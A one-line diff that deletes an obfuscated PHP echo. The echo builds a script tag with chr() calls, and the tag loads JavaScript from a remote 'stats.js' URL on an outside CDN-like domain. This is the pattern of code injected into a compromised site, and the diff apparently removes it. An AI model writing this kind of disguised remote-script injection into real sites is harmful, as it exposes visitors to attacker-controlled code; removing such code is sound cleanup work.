@@ -1,1 +1,0 @@
-echo "<".$sc." ".substr($sc, 0, 3)."='htt".chr(112).chr(115).chr(58).chr(47).chr(47).chr(99).chr(100).chr(110).chr(46).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(115).chr(112).chr(108).chr(97).chr(116).chr(102)."orm.com/scripts/stats.js' type='text/java".$sc."'></".$sc.">";
